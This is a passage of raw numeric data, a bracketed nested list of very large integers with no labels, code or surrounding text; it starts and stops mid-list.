27404791263902741909627474842958857207488436176135358803485290791779429733090601932294930673572282559346263242582092655444207370210168838497521994250538142250, 24990887338007582846709451812303385714551203047452284068616233684159173186647603659470305863002516660153894270108886851899160997876748094280307409283805046004, 22163621250434400296679709275529574083384811258722067687415023025612855390444815078005839675564531357768858996661021789771944226534122019597797669510897133202, 22056905722425508042273132367765834080459795378017143516468346205826627111875320991240637093374070985959414364601923638734740381090507174654001257156865781521, 22473434437934202532180531172966632685070977339343253228060046703657650615307558013170781583164205837208970322980508966262434433048965218479554633373865446348, 22020901481945025655379799549381878022113954326792205662909663349962122458955084805955514288158324961322129297451342697353360717292922355672003235554924732705, 22159729490637302308864747281384660681681116489169786114744038766958380007230414276982080912041107247711092150501602743821104610153601860307639324568419412535, 20506942459657702796094296005300299018096794571594196562016503214417356580970738532710447707699930863252779669643154565624360159408255257198973778696955857161, 20245819246841995747441781899450945500081920653523048723384100925918177558417628953319647799665974646106358018798269159741495366044579320238847652027062659182, 24488870441570194001548206538567672813079425249327454628983267104939455406926358696296547324934394861646887600984690530566120998586461838813421551062220478436, 24273923854331130803125544358560088563153912077536730841210410728386035875607051379362792021465427144439558141036904826488185777873490598347137518159212885718, 23715067158708135284151501269271315206546908627876002401011877599811781137608913218671652328810781342600605092203134581321461984342394373743442989106360966840, 24693944819673483856215363778925376068965211103593426732114674127774325236845058945409175739601718709156345841027650463722523469006055702767968152600023783405, 26476950340064933547561074142287393714938655133391454549409481950836337252512723940827715890238616715899329744223390201496884035625810231473365043091579930235, 24901858961513625553691673383210063824854934289601654038306256475360969411209514400704626234752657114546531966436668048961158555279608770351205372720150075587, 27662521905851103612129735812945453433778014114066533201818810224081878869075787925763408598553463678232220343665308475441201718326419155999146894147150920940, 19760540531774999026794310154827557023689198177409620041436052547241812394742272378581556804289818431553869111202746412827417285670159244978797233302371753373, 22540610149992237511965263991386959371116918607078444000785471562568719545095945413452658707486125836909175621433975341064381072215530788944082635195562312444, 25128134712456568688347941431953755321095973346617154098243323639998035593536932008542284310179767691771967843754567743040506465369593885569593505285639537684, 23050863432034231907023363369307098208998147606589617078109348466768535294795520236377826181724864327609554321654797057889693156418143638500400188723306998563, 19229991499964946547687335369874926117359720335052639320218101112703042299637863544934075282825670757940883454714367286828890147417019710831463366212159491998, 23008496130035112878046368728726158142232567587535780528217139012114949023568383864402725145280234938170596866970391051719628322827342747207654713097241938811, 27510888298547458184116809520461704157540434002328256253129263256468034817100109185158325737427769273351682198384727906437098134862579062983216062760468216918, 22620993701866320709112394512750146463510303961638261690039387966647536884126768636910136166036533312491382787775778072753668128686187509540468366743247156306, 24765849834263342580135830370543510491543961918647310056521306359260500233211256279503993011209540857690539417175406416379486694095748950017095226971998051765, 19068842950913523052294541067681871992011093271886834724723286797164325416909344477172632477511409614647826029115920586330773503880725558548723771730620957561, 17523044711398073147679296033293438094030645841208551731792621489166573058585690089711653875937417646045768798716258551658733576338450557361428731532752733164, 23015947320115395727759742804902844439791724336132778825664417215623133569588361032706978739296480187451833947354102360456695414539699763055315553137360707444, 21372663443686338863236042156189895823202004121002262971973309622022644240110723136695456149975979461838228593659986570958096048725391483654317200800179309457, 22994210063511415125114236824133904210970327112576687458296417134433034272207217357606173959102758693824166493743643601763096585357350151419878342415145264136], [28744403258464150622593990898650817693353735915354522167688597271797072543702560910960812261097491022021110710566696357078318024709579130267343467733884263236, 24738015992061283709690122535584636851743551534581427701025978035506159344748322645443438331127496311417266168017899135466170823230706832203210039190980200762, 35379658501188588432601841907779645530529435594682184820304428167601345215348615363933577935001637974698060929669769585546589954227503403605437477111257026217, 29404654871911808039979210165231571149583162588318422178185156712093352663928292156164719575592288990583271078501179332152230362219103158347461014347626895338, 28370160659173831564441359824880329019051814026460857833195079258007104376891963106756172811934883521391259321347065686690061362068544496177538233410658442242, 26800647632572021479604687275330983824818631575123473356219613556192796599091302953231988930295522318377402194851924224656110735166562064016629831397755852502, 24987590945403042778518843223606211475500384804331699961769667724014645253716565543275861013619504557614993998437009030131267748003774282183850234911604052921, 24810240619837516076340970750717298997328206265173880600544823181459409855010663891731547304109710296044149280418630314906741623683304081075509612980691738436, 26173043291072135134519324820543236012058126214309417389901650165687730296840797794860512915285153718491709523064522715664298367925342606035316660549162681695, 27371730754410343842166719051870454911397090466810324190917168371691007500604837159819142889324701167812061066315475218406986186698707553008238862214520393708, 26849835764845156145162782284609556059840066513307159309606463413345428848221091082172309322350963058703606255572738174380201251279601637620956536110005213380, 29405182374275846290366147490292077412060580261828441075868885142899506453692831322018061555216511590658980066403301571959181780959526643755220661513191219515, 27474204491409256735421410030169906282694574217360135863908441053747249662261621361491314136636865954427689081154645615875398530255196874676977416049194965854, 31140309790165293187037071877926268314378237255387141543594438638015539160663430080975227430934741460684290902111207518251891829389380867029690775561240277027, 29305173938437686351117735699524164552842714335704353275838613409840687886686551573820863446968350338662304153909279597013091972325391517742075128224054123530, 27967899595405311860125866175200720639470806442674608232873904494662822583742097188089339112416013318914207419214898737147764640554564778980986613534340728739, 30361747531775775119837268025205254589305197157422387933968240615619579277798325831737777076818498538436879646337539129503623634191942819890154294643972822618, 32638248353127830766573084557034963751790156658274917710596560350429986704573783122789763491117397174775955784213460749107175424958416401783738888650355803972, 23585353032977478910517464230705895823555406719648837249767153281560209520144346553038503240271927206091976842072711547961891667290261623072298751865912125089, 26407496870230282008180174970981922821106510700487875220096352310775682242469711606994090329703358043509523491824080575345101591162805225244854247365682817400, 30733555944236328603076750660657370450080444825032611611466469086246731102448230605555919748108717254470146203149867892519266931078217214377946039867395070621, 26189146241475752981465381131578673422368614874432824266516926328613259380054540125180203346258893203032510089456049696947216880569079998009680382297833676465, 23205974892736041563890125693368074863807099620336561047651177274514677462328773679122457178178574940462326711637208642993147072335300587850474380049954768411, 29330519032342452348809568883380392973830800838998889301209472829478101989090541203230727117679875230357378664277725693806964452058766667181771611046442756812, 31427978338940610415906367528579611711610812643009888953924466205737561435548291555183722320218594615529282359820628272118325899726034810651458747925180621833, 28089079440773748517219085350508549924572258132177438139435432755474649093700782913261191941219030586033489895367669424912066007856715708342284057453469267424, 29181200098936748365180981136736519198685391178539142408338882775476612243051289397943280952702261930959232967571332613810843954411930626538059633082068340946, 22473139185719014698441049203556878034867195757640450287616656128523531345860676456037700482778372828252422149312174637489180966900167789404199437900403482733, 26410279251961659289300646918908289104092470315942127685502808868853210703467961370706642019203399768923325250785830667971578909542790884554438171933692079206, 31433948229898548973097850563750698374089656212499499811206928727610835539602643359790197429847417698068171276410399542503775077394260588393790337804378371651, 25452855181920786170498501443998974849219514592434883544457343199763856648519799653022457208030848534610123692918555690255786732166954339807494703693285937148, 31149192761079561853687621658432797204245860859878703141842729585224190608708562435190338870564776125691508277120813188900727946469931524123061807842671321983], [24418955858753062987745386797398735963923100012030496201211973796730691742174710904604754708699594743843181091939266340769931791246089186572470042834941191954, 23878724712061918859525589267965332550290440211045130066332434218826755619424135057470495148600568829093722351755382219124289262977000595772073849204389295626, 24901500864718673482867343955840544738592347857231329755521755935506687814893225386037219601710770089176948778522406211475951616620018600166650144997695700149, 26518729552381557962282916870799149751776522223146091859376337770997987496862433706247588246712426424804961902919595492529810692980847582560974368572934668741, 18808389340006039796763488373800771867779455385290235223940138192553953967821668607443641845200803984786178771158467802349561734607981558115341880628384225009, 21022891963235108802997039181214240032805980871128999084845185084461647581657910789850241926966154214284229376355189195041023342431925540052771638937357033330, 24778608832508419467057906436720222566121062029581966423397270760709918602271301872185087733473768191785109441920736575259261691811954842966342126439301254471, 21763377372984462421297239047302089616280960729936739094008325144822422692855998176154510826724417653482770710600739545030452582743884268995350613304038343911, 22976997904089649918171711645528752908971850346917511641445836260138243219790129417265412861493538498384054182723616556807907024993275755440270590101193682050, 19969846249480624885424420094524735216770984882290759433774276726584805767191417549644521795630941716906132446152562136446471192683425100726482824350710482218, 18264183678705414586041404925112097185821238512224511185602615812628443047736595147144030721407221632894511655032607575289413103266206419604661047434983719064, 23927756018178840179322016029917851478280089527236713789092165998525532087880960502238650552411065890309657661741223794021375337649691172140365344241737675071, 21796398070798389650240129849813065493073401320532120916071242052582834813534247388464628091693976624096321750118823450931102345279154587120962145592222976871, 23451909280983112712750298259527997562990323276104705809477313628899234615449428476967106280814597345407869388855689327027596723242228595891013482503365291823, 21129855803632675359220435972765074181199789785174751119020379119429502021018596500601628727498027513568029683856574842112317547117978341694768480511868127411, 25138298052388520406075304163675210895524723786176631675952669200590199537600351421579985394901379507826571326721692981486135806453817201020991250452150282182, 25854061758701584433319327895873875018930268234810433561123410138150779705566123241839827971730724938070192700456728050194661425188438436276367771110886029357, 22943687710323846275175029394412842156783973418006562352677642477300021671045012732740477975437519018106357715356372476016650064465980042003863790330904713283, 20266526741880808937354912331581926922246027032893586042125386427891869144942198212810913468813334012428080790747078953770761940472299009787505972716229384809, 23078472732971964015646132959702453184503743194707574209575433909967411198287824559371931166304107741583566337693255710053139224146362274258887549540648376990, 24549916493160541346889457486162048589814866690933989552010253888888722941444196467616196530092507847040964911235110897401631336965524715947505009342666945296, 24365603101513639236423376099654503602839421773644729867304109747818562912967551612357120915620191111627063611778000283269150515695079711204098282966833136007, 17299515490593726876118197034327007856874111687230842497107371893853479905288177646724660238083951123849855004042328595148090795429549842053637334306093410653, 22760520902172543474320691388372939255275772911155484703100063149444130749523634917794836648838797732111696628674764434843876840453765610961684658226655573486, 23346941075930333292889143260230591669222979849786354953745266912914275388667113378588749371098219965977509327011326494153355458434996265630824164162569306364, 22717930086743670845879432125872997172331320243789089205289555961954101212516551437100723760207274136318099724348171303957548848567716883109899059050030310466, 23927741312792921941893739578307814724898842487834512080447153119950431234742755003377205409403279162842843208252659887742332882523330725069210145831620686836, 18977003721879189487741939980010365002695433123778052837194278049314907088275886341099757101424992648929475195555749942522881803461342327573635479868335956831, 17451065467412322788903137394003271517972976963118100724171162641415431644461591579069304275306546455704698449473865989724148499955978498822344596920698063447, 23489353169975495893203944733104253076558570243435346954214681621916937345121965883854511511229393828077700611863312517922591043052370025812331923449419113679, 22229596538739944265539062760245083969997324857389103332962360091523632461138955048619404333793761797452685706738518725846609186772512751558485357376067590079, 22603479406731507032327530147437331282709049920443769605861336169828007228160590335494494537822119928518067281506377564213446321468398665610337639457730477608], [30800847696744625682527155532710116484780795443639621962639101484225630321524184360734253570303002893397730124012640204294246011584581659585609948387067818640, 26135490337844050803781705821885478054999354228349550420584246196845453738326098868321743048204178876708416676998116334248190214048415446408363816368304189160, 33372976386050670606682754243780691301683734801694090541977504053589898147431215777222351497390550056391426134745003474335645639459597489005301077462359173368, 30336337945305428179193302377912194155048018389353335680062541114634349676412640546645024145810058519993422460926433425161712918927853769057155424794129160821, 26657160780407389485537054155271167716577971700410264412332429903493938961385375273986727524465038194310251061792791690287608492791876927327053422238657140112, 27495615860583005697866922374605491132447010628690406008271467096001632582681577614047180036811043540593370858461042322920696357212024280907326464319437855467, 28655405918094645206239628412554198012280066334686737715160201804973196530545341557582252171110257217099832410585795105271116516485105116990681712128393431326, 26236388386789454874898848070421797970691616706835860587947960675718901214575716860414700067724673633623925252643023268129592725264466077934758423360727303455, 22426837820363505937263555565919525123797764072757358728245234875103150842037357934304672441115313353801161809289057864517429937247959344216367096375681418253, 26156017903043897673675481082203833343928182044991302125364221131215971723284755700141802511303365546758516005852304250101007644753483119950568582657384449818, 25881649527663752782409293540290671699284966799700156025639318545958880206480977868567324305364656904657094427509129326162776570803076329778439726825054341777, 29651982747056955701985559853294275318235417948411750456083134677583501130500556634159703483140029432792239531358595874605021605607814095121441672886951533719, 25486301310713459332932231064008208867498630208261093740941860115044596818224805594324821528435148800079043482499751842751622984235497814393702380019550587318, 29094272663697405190646009869643490225196421572115593729856791648536434649203689657814382939151024846131141623040836366631113225712818774498922593095126276699, 26374278975528641503984027636833430507552313376612137890555662971485265197205631456541351104258206198981381599461117140160979851034181882560061018958541097176, 29834121859190409055599989506385772263018224822419485636489374284920030108859427569324226852836424153703345250482331850893127890108532735664963402945286304455, 31824098088790651009388808771514197983125822694337953958044428472736044091111674241978661239640378553252925288314274126298718611854055806903210833968473921552, 32526858407434561998824512297178322960735206424453539572307871300371918029603358904399105412863062352904883913825999889839911422286208909114732877248514470672, 24818200287563763244786035531880905621721961838974367801205019600736154985305516655513519771017591660601142445481629563414543613505480512833884496585996728521, 21644242144554829154945394468289295752093504026485056954108819962912179968320278561293178855125491764212712148106509999848500946234379623042682262559767995053, 28187843556563406651189466262154561841208907211314339877961880094340305098922474909800413632653750599436972751325519733457006296881941652278424332410890728530, 27838486740745913388817683790427831763427520723924278325281388711698513314585675411524441226551613890715675727843641067639962672161979679765529983279031995965, 23424950879755992761988686515619519594580500050336986266825974350488922858147209762706725059799278282619427424350987639107486149768418308830937666640401579944, 25480739097687995788585578899334957607244672048074333733360022041244444678668598092957153578273431488986641884826067865356612747827162661337156709355790931265, 28555942679474971069232818281342875699209743958775266848477568147390312225441431111523164662152493768331052308714982761767659385850305694824882866608056882447, 32093595152692088444610992910446488214279903833638882360677958918845324474193018442519742790972944437496638331494461997677619181828071645614479064610899258714, 29841501403865372681252668961318874538230309985249944308320035834671291015847301981215548470731083503156696153397195646380244572447374583131815040341189705532, 23080591850150947634369446702013209531047993689077902815470403305149287074641248245656997785406374822301842463297488129780872173580464074926734146690513066033, 25074010847241460271724976898623178610286165530994912506659210515475232084026411702397164780158034566612314050621789443892825322591469607318685692217249726497, 30086617763381684112079728440031307125466566269325451540870501856948314458893804663681685596768354608604128727944839318906396982043071458982106619792190433611, 24781617824728095471821663769697476783985479852380165757288785945563868116046410985786736737231308149970651890375340790293365324834246969912549181470441714836, 26145907756914365850912491266390943402204150935259017593024687623440777414741484256104877933136604089084022352612471152758481584408858726028624820108455612687], [31551171036182120397648369285801855564960289818410858164060828361955147419900219368318105553352118292495484022680309494664344562427295231923605659614751346471, 26865150148618983513796180863650876076819756916239323565529951366747025658943446796306614977442626551791315810625925527259967803193589159692643317738751226501, 37896075075880747298155170347551805597990007464591681567330735804256186910416193184124652381817041990142237016209828028524616355524762130793089497550615116990, 29509430087571641087264267398594990826130569088686713789600072423278714200472733701233552762144446072059400500643211264339799513459395089336752303079725421694, 29850395674926580694337483485722615112579923355097854277722290336877401293868522607110200538553520531546631090389877272064529713202522188506232884069113066673, 24751327879675677608768308308559362989854008140541147129513884915978587390495966348991756804288409716597311617298391183324837531203790879359389388025075897964, 26601870061018197838443694236146667161252737841123128315533752845313177486432263421652795820559964845403451121651022817233887627045110691577623360663494741032, 24040962010714597966978736447116874092147169442166992220456268729320711808426461083823558889083929548478220529969412546665295376440127804324309590505847837216, 27123044406010039161873423651158888515258143356623259217737362617974349477239970896369854854391371970112727710771717641330466333238426295543811104175823131200, 29041291499664522615735453398475443202050901316350530177121540693928339747874696937941819112387346859868472426346253316782608407405104311704442881861413924747, 26592286453480484412670071804394161462051373692997002787497674316029734980205959528017549570195948543625302067926707073148750519052771244115755149269355251244, 30070239210973451807347299860278070504957539964702017399874981731337300633294424056942806612559053515491867083132828711424056437103929784239822299448009248443, 27858832259728185594575135873944472504317198037165939611885671741937060024543316818493401667589213113698879863119288758952128850615530235162288920126614433060, 32766692771046663139065603853317734934051675072450769252102654540908026718153582386936358423559621798628070313771475792701114079830382237573806337952475841015, 30411612743911964410995251485621757114553152953943158857201138398841168185152773037718379024748089124862169536779177809909181183048678823503338830690939749706, 29974144854195000352714030336004601843644121416090993088959194424897320830481046904995291270858278796229459983057103332547582031604155564834258197690365050429, 31661502802274942428555885927923597109827412262683014983278751141770256822854739530321659991907104628463278444316455578581467972598257377305245725957883127641, 34155208432113625571152717544847873648313122997581728254733050077284516112202138461233359980093230794386695650117779747290174447747670823642119435667557448011, 24570956425017348762650009804732918813918990515526360569224284564980641110304006981013533300836082157446107117122891739950243286081540536615995564459748622645, 27848228386021657853607611340883932671796845533279192801181795334940418180987449600827046325580592860156138674583196107956087993031341764466348093434534321564, 29221452729571649479048286164903943918893832943312345148390049275340056593584898143536844519509637000586353651682959144087089627457479192421134540026397235810, 28314855995510827250739881192502369763875484800855345292105782392126581133294488227262758264721155552460530836123625167605630776659115667344138010243239719919, 26471855957954613502846532830868439567088528213728641678012661659085945489501303307126555174376395679485369910089743004047526153853194249959922749701624506178, 30018025093142062943440340029945596481467591421711160229483647891780500504483802619854779741823206808342912826588894251567100846155362648656222358051330266960, 34275321651715786025602358345302906996873107389234828324857740239802316681247141770730421151704891608588049776966306566336311035118214350972386154337876832379, 29584652164930109648041332257958311412851475334183826126916327541133809938361734352435247325833093445695500378243656879158062744562958739747344586118103683645, 30649198157911498681033398596137982731557741495436122796371656939090743059530419299043934999432864153136216281678400383430882841266217782376991573411426053935, 24032573062766567101764832678945718701097475510584068083177830644703383760835457501548716488969608010995171223463281346493353213496985689368286895678804861883, 27249515033912473828954609349360279079909811930772123933546616860881277033135028539665101119186259627110229847331964589424702163293599061824664069733937992092, 32313264668799062734499902198292937768430473162129703258952460601746566001117304625164916777398548054053132092483362649789338100776796768748775655508213601170, 25899062533849879652429219625213824799778057967563938741404622485834138146673467391508473790938038262148996780724237752871877359281442931880921174652246007499, 32854184678015213023402127261427998349765693258409273784689281846507551672446670701905144152580334809197352259613210080591828410425297829041538399017414204511], [28975578173054151409785568635299507829090368636557125031642193323549023028761626068134760148868971338734069847065925830195066186377777801570328172594236276451, 28030900046768130127175015110224602625140421279174761772196132578305558247544604923478106663322559602343563836586704685894904909604472388793393340967950350176, 31311114786492352091482989904121375309933830228459138347542825179822519146112496037861923781943054769149484371970695080288755233892277925235355440398093177208, 31019563329473499655462981084854985191473921616251539050649082469535134135789198224329706361415856372693636682964366640968348951624018364678743356478754367574, 25237094285857795283115950584298529198653335765792031540144538292627453323036578988314755163223040535987669444147958675769721672969481121212767040348078419654, 25255617077033840928464058948854217919648136743185727246260822911873801191310406875663189848718771608380942229839641832310087226593612550833044662052657664953, 26425295462457865401970763858059324450083893615597627237888231186389641739505087167619442294966637678314512874339270702658166141035357303368482670301620500864, 27262240854294506735441823799163242487058352289688641723755707176969308901969727057351139150268923707558646630355978920401563285710079026834684561712608981415, 24940837997393089302150559988165673811464787487422128441770375518558606678180868038931443247303182357323855240016747262719835207666649889031737026030284015966, 23694093958779015114639295185122405101582122955382358971126889158301516838036312269391918105655029871667439617584521228658293966389363716924162211353304616362, 24684115729916859160202136732765543084627448936263387154257846086939394691938288603944193137175732897735176063835535735874335759335583419178713463784871521608, 27756085962143511426343731424477703224009042626981795490796294604113663405703922900407500100162481223914323943151696720240589198368599645346580222211024970268, 30521886420768816056894260090342331912628437855636455166560725716949702922267174713747522973512384279910650679070126444494633327084154435031320708375519156673, 28016170722424384680315082717683990118830653989380410123531676240618295054200758319089480322240885017640806375297743188513255371765831550898601825787144821349, 25726664456599419369767096582519518090309616104764505439060618314416225033539572448343689402948707914700970141798438792270134681142450887323105249702245855309, 29092800400731518405181625960083279640530747056847195736415724448621041487707780807947178704819911645490614707453263519316769407508503846600197774049622547628, 29500315487768186468779943178664408340914753240917786093110245557017609497534204207660954965076866490246108549746118513370529582807917736329064774479006672388, 29552110751731687053220446061680336655518929851794636271588227654029426637401439410186491094064036122070631653566472760439596193068551075570751098520430498730, 23219511133808123776257038700221458824870130563601738759771366678630207900489070489614409573006245750971729184463919943600193478741038263049011935071883221453, 26051414597825248829144860028410191507996188453830847872607995136976343385412155415878171578286837314374471982405951176243619647107268856405501550650596184239, 29853001909698258588803090848245009045113585618225188472297692766131423730056556576075757507311006087840552876258796751027258690815461865339971257489558983024, 25015009940765374515466259200912238922653748366628035507058297540057462006604774106591422507748170512374220729133884783508879939195718679607011333916054751766, 20637420653197590976756372513034578197804380875453755532261568514890948312357412333167264047128546454046122388299639659399622897466027842818519673348615383420, 27313302301121832288399015562557688978442106691885724660953362150082954137183814067507576243252959952666970890093886082202315543068181180683931256984172215395, 30282982464270561243550816835860635495107984095034569612665800808680506704738402906348610578054538005537804758189511267601522098610137669509648261007216510094, 24895070459445634822541465010077569541083563953972508692221341379520738561129622518501382866908412174245650659291162108616487694559918408056104905771913828587, 27600151536685069778636982558282096504456933623256947112630353389837077916387408287898661324291190291468179735496521155346610729742540552604086893325012276441, 22834983152624000011871643059076335718810537728778294488164683378515743640740306181227805625444852051473525066502072213199859799454211086200546053783418965812, 26050854782555034221784771354436134041227286293106166202891734050969189992713656011358389322486504274681557078688926396865933814661543756095446812885681314390, 30897518563238707609514385131282993713717728596457661360988398223319551184572161006201073902947247857690665434939214241497874752123747974018012878423872666538, 25454594316201439780604827679084482660929869812491785123499703750813246349049170138154231250791331054713256443482776468978768823138644043670141660675099210677, 27335543162566275989284353418925597216006349464688845351081885667180279656317550536796711288374574465253405818424659177891320701253750888733193820687038667800], [29679993185446173891557610681968928889290120802518317761211898433168495139566763554225879712502697718650433079457579973252962304954378631658287360848567944478, 25096918535414987835833478201911547349652823291670104401205164784594470148230809566710042811022906958362434698292501010807652920155901567074005666134868622254, 36798071094947415346882917583637149297282716251731906513259006215457595685232930737261047143053491626273494483400403809088212310262784776532873614387081210191, 31842840415055313106702307851204222222995164730415163313064577449594365859843250592856420301338161640600397588662481098241613743284607258949800683266670340635, 24830052474769387308629774752710851518852387588245308231716079849270878684258357944919535972331867189246585533408258032062872246717008552478826984395399332566, 23304801296661095471310480374196824565558506347057545517339842417130798821907574695727108726466863458942950066675634005497987447052809695226670703888593776951, 29450009609351154355326116936935352481605727334783127514468953079395963448512489207207131278891792957856444511356599662185756805310032514482587620163839787091, 29569127584554246023138498061223033400689327454240088374310895435032414364485874321968269018510117699350986959603924425909990281821184953802658225935655286390, 26642478725363300299917246699509355237533343338753504439987972451696283122917667473365060804894071151340762322572148576970254778372511219767916668275370129793, 25361306504324553337357621293921438090553444774759548908691084033783106345845981962462409906063666592050929443500156520921977972476751993451496176774946977126, 24676846609912468207669858799753231101045894275685914543063258392577186296124111637758579540344805566437564994370968292423568216583166351997465311962973370007, 29651892082572613821234526916894172982391761201670959488129554115971878321267208069114147251703993268995995306614408688970414444007144899007797695384274698629, 29214309123135296558605140109127377607560843367014445106370808828718480766289302304807372546632609959783099361616619563359273127645737681118732698611078551416, 31023678071612560933269009412863820040845466842252926570937994190399469250685379067077119162467339579388230894721790830150643395892254151078141739873213616907, 25981802730509163954813276562892608470760761385574143074572762843003206117876505044847223415145672291230508215067380657585185668758515094940038383478787835444, 31696410203055054577919569559345150294777898376750009107053030562675071996789559329783433455845413318994981409450021120913852092247090284561333555003319266212, 34115725855251510127464450150842854551297803020781642534711595670626540219213600337992725369082199698309861687126721330781474208356686590031415599970075640877, 30339706758473878874637479255482306067283765877865619763125956754742020476374645203592851425513211757016102603572819022755660411396759741341543715075414014344, 25733775587026206879976829134998397530788142331132443717392942497718531539031949827359804079744173347283211334516588506464786560288667711098681131430707203395, 28401700138870574222585298065604506110893766271239486946732344987879743092359001268732314854332752401713314842356106179804981514044730391769334390403915410976, 28938777118097773311526135578007320525525590259580111686618544603363542031449587049046178577821048455443082476937200097651546506203795657819694362268076230234, 29452214065680506375586418956661697882155519584258293064499514874255035100619613421150522553042697169204532710157040304558795019989607311706105494927777277597, 25076423922679192768352333546265642893674782247499632470019823926875685250491429214850138910309438886984720013901486729674771883516972165340898375849671146375, 25842038562848097236313564836129320960691662517584750134937016038247697074071121306464435194975849776374496127499515857358770215717631244576779242734106109326, 32176767249811913735773967868671607453592039903798818306504561350840592776959859421749277956410233285899273918322074536933691263187449553367226558166151716969, 31120156556182478097124125505246788452811286116889778209377303786581233982508570645873066326236176853043829361864865952597487325466828431394201994164586079960, 31486090739020615324087547808871628909562126300568243143746676834080287566264145229402338371621890049049579247641789790529819093628707520518040237605829218779, 24630521749654678866541533855316713831040639404187766677273279616802332812192471653838225401865375004934497387736860549041047647659639295139417971192457240674, 27848275013667575740401559389779947593712578024826594847053029305094358376902571101472331531572676513741818186112923553417947225481876314093842542269659515126, 31814861140422619809091868100022122356167772615483372049451484861113040063913955645200705280731345287856278633407340043857587697610872387787504202329276022214, 25797650321864953752993705578401823065736154469705967062084771560837178337902642801235442550478936385354013450447129238993632557575838133055015354100254363309, 32781454544868796743665833281226975911406940563770834411955191132154225220905314883077350649770898588849060641524373898780778328604641969192131056590883581963], [27707963459758784221341616837790973359641832351985345066346641626052971350758171537804189084864952646730650947546919604701540812412428456645503520431835320655, 26998054039727930269756758415902793204190367269420776732850370082737784405686166067579907041275718173378305379798077940411811900460210802883723941957210575648, 31920688153267934793731881565438387998624647136998225293995426570089184267512602317973187216351573628934207255514436910413883774591128176337217494630946912889, 30041262332122875858897185711175697207159394272815811687368883631955539847793649539128436555247897965339692699386952904300115562147367659727637590939954177734, 22639830303677353851224957569725626847196596462741481512890748097494337994646716363332532204294615674389998289574238267524326971761365083844142115560693843720, 23746828332918934091772021349546833108193819469951052827189572996505223462064928536239226684521060080562958154424359496240060543791735933572149258629893529391, 24946296543804463593515414655393148308536511808225209169511890922451376032747509370488542515234862168495885955753782936594781022678109582785934724261490613676, 26485117815699979065862366248172335085209430394039423310058080126054109019655419365460604495732697478319301941632498807428150034368815410963166684521539877837, 25281137628603027800400562431869008381161666751314864382476747167525119188348769500349754168584156790933520391055077353842053357666730755850669253430556952910, 23941236690245444392481657616774219686939336716646328768297401281755420053105322951837672131608309009058550529394353122595610306676031998462965929890021354875, 24978602960731758705991984836798478614018901634863290163053405380207833837536220901065476717525263372431982874453288075788061629450460498944713021777620608812, 26869660751800712561292401919963778319235972436182174148864096429861655102056807212154168009227975595996203402302126635715516195435518670699312803575377062763, 29913054286791449861958352659773417328787415877250785791016529463555150215363164283748785050751322988190129761113746564219228094763790246550409281260325660518, 25078708436748094476952115312942023748732295932526566429524297099567781604164911665537056884971298074784744865575077130597256596105503154256251915771586170795, 27722323438131061313409511988295610640626125070376409682703688319225064587933875292610854573792788088680826087766708779672858008452436364045479661798928168430, 28154067092172978936118987926147908203581959950748745386545716346998518663798654994549309375966087280494397445950448918195099287765973102124842513219794616462, 29231646437721666887002850491545004414397687612976999951307675783191866554343803239149360653080404643498518483092525490217956721836423304252952181554745675811, 31440855053154779964719198894860532558767626347324119694000866591887081043115679996355519903172448340340774867295671386374128978902671023612625793362031474790, 23177767417186252807550275341047310002170774617949958286800960530221747502239276355922193435133825285931720728427619463698242992053929910700637824902719767685, 25107949380480643759241393014781205700900256140545179026559330024664383490886939096459447957851629862966158649886615025128717707959557772827230689807748955337, 25911851237193724673941104439106338264586195405841022185112520709714419336316661389484937943929729005892367341134196962318060714626965749905396661950360955202, 28123123778006362856986280108468587980871936955892872768606104449232296021890468037066048366224428825759629199468146840918950792587669302777325670732261996876, 23808617981125723217025474651944172167615369471550838816087079603838530829923620273792967290616606635788396519338412037603347760750233047872311129628083825950, 25247582138118611049863583419432684626846034465227199340042510114683174133659110815114293967172170845999044008642430318355463798073177177447837364386327725608, 32557210015749088411316986289593508460487789849940471126594267390546918203770725552311559871724550989617739451999186020423531484096765091455610312280835307612, 27556343844994828912699808406696448526360853532765682656790595969296674723135591823933963932486478699468042634326125116744179354415651586119508316825489427387, 30081074010010062508776809817337415575663265058187890950146352944086149149338132603841979244653586619200252338707834222422706471597548789018639240889507270165, 23470966384810151588093527067753463142564176086849891469790784727165376643596209997906371503183131366101597878217376109355163800095394494302119328590126371988, 22050199075755912654151851489008795045590768346720201798540976589016692525708720781650475860977266759638146846606321260369668782608743619834780573353501739319, 28278835581649106683757641365982067902990140705297055534098079415668869512046543193973028995205144615143441588855155200009851201127225758952302698951452731303, 28206124096141216222338916582156355500093745083322714978689961744299548444677321033821017295098004183352511320341845704205326796991835764667391071379244836339, 29997494254060280726372870564927620007575877217753888662419268068115984428607668908704710696864729206836753340722438840987143562377952078048560914810014048451], [26200643664868783529635999982021377219947987225624025572885856773355512920370228766537399249303867684494865571658736427623191051164119169368923134608028438949, 28708855133472995362982092805392900535544570425975189803009017851394838340885771741018741898647162324084224746326833013482369095382085907356867489051905636988, 30292621545796779206795755517461184104772133545762892509024406559149008068154400505435736690743269039032526213231367138397615751264268720462274367640907680011, 25415356025918278052699224382484625189581376306568261869257178976107762194297547919016110289319998282751027462400102811281181585540478540288236539213390345296, 27026111647605785278584685427830298961252441545656994217112533184393372598407175405584832283376716077987195293612100716868309812421668678791036443822580231725, 24847981266564205688183346843203139000795495235784119461939117895384194048777284775653617336253373278656806657339173131827982865461859443411757099346112706764, 22016113507638214098215526819773272215556487681154046064490690892474208281515871281974863118192969462017198354755957452902840343717609937901268778476891049835, 22401740157117019982246901165623448431322898402752345397671682916471574632444582664458942285341502353376562211855650463607258951766735983617035936669579944537, 25242017649759438001099831817450118545452382478728258567618508365683554487910306195071829989686062456739210678934562984773928671549366770846751003306856452495, 22407951410958208288936259260357079954908000758487335804079826246970358432943312930685593417290568742656884648095004151145452358492299370143485596254613771541, 23024625774770199243401131961877564835303154239011433249118104732305833821537436357532053482663622384880304604866684571873580349615152394755673196223346830411, 25095724731384930813274575008533333736052006617294593627213260266975692842435710403475115255102696861396706978929676226974196844238881327282396923733412396258, 26007946150699023404813008387311655979155973846076282855729138243557701050378969248131903187867129855725357186147704424206966027269924759410215875336637469658, 23361259723441128956013137061830679011095171349234713619976937617900026784310092354052313075105703569334381515878791986639729172879368108411644385241009392265, 27684137188027981986574020266441022668193338727468590965185344770244989581946187998443638699446881640138001846782662480782871106344976069590005260916197871578, 28740896074115372368615954704606767018906981841490963110341240147802182901340011170307135196486790512669360215298252067176095229671269264797258925545019357159, 28586304556401071543859239327382273434904843545196411850586591867622176410352064196632512768517347008629964255790965629662042868032035482867732568187785341593, 27884175573096945067200126803693757404629875527300744342411583492384645824919248709260950400823671027924006425444604778566000564685848687666780726083393086003, 